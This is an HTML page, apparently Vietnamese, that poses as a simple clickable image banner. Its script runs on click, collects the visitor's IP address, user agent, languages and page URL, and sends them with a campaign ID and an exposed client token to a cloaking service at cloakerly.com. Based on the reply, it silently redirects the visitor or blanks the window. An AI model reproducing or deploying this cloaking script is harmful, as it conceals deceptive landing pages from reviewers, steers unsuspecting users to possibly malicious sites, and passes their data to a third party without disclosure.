<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Image Banner Link</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: transparent;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    .banner-container {
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
    }
    .banner-container img {
      width: 100%;
      max-width: 100%;
      height: auto;
      display: block;
      border-radius: 8px; /* Bo góc ảnh (tùy chỉnh nếu muốn) */
      transition: transform 0.2s ease, opacity 0.2s ease;
    }
    .banner-container img:hover {
      opacity: 0.95;
    }
    .banner-container img:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>

  <div class="banner-container" id="imageBtn">
    <!-- Thay URL hình ảnh của bạn vào thuộc tính src dưới đây -->
    <img src="https://i.postimg.cc/FRXSRLvR/720x1280-9.jpg" alt="Banner Click" id="bannerImg" />
  </div>

  <script>
    async function checkTraffic() {
      try {
        let clientIP = '';
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 1500);

          const ipResponse = await fetch('https://api.ipify.org?format=json', { 
            signal: controller.signal 
          });
          clearTimeout(timeoutId);

          if (ipResponse.ok) {
            const ipData = await ipResponse.json();
            clientIP = ipData.ip || '';
          }
        } catch (ipError) {
          console.warn('Could not get client IP:', ipError);
        }

        let metaTag = document.querySelector('meta[name="referrer"]');
        if (!metaTag) {
          metaTag = document.createElement('meta');
          metaTag.name = 'referrer';
          document.head.appendChild(metaTag);
        }
        metaTag.content = 'origin';

        const params = {
          campaign_id: '479',
          client_token: '221555331:rebahrwBCUvRuf5QNEnnAqMhIxF3FfDGEicCJ2LkxmBHjNUMA4eVoO84PvYwYqjQ',
          ip: clientIP,
          user_agent: navigator.userAgent,
          accept_language: navigator.languages ? navigator.languages.join(',') : navigator.language,
          current_url: window.location.href,
          max_touch_points: String(navigator.maxTouchPoints || 0),
        };

        const response = await fetch('https://api.cloakerly.com/v8/?' + new URLSearchParams(params).toString());
        const data = (await response.text()).trim();

        if (data.startsWith('http')) {
          window.location.href = data;
        } else if (data === 'true') {
          console.log('Traffic allowed');
        } else {
          window.top.location.href = 'about:blank';
        }
      } catch (error) {
        console.error('cloakerly API error:', error);
      }
    }

    // Gắn sự kiện click vào bức hình
    document.getElementById('imageBtn').addEventListener('click', function(e) {
      if (e.isTrusted === false) return;
      checkTraffic();
    });
  </script>

</body>
</html>
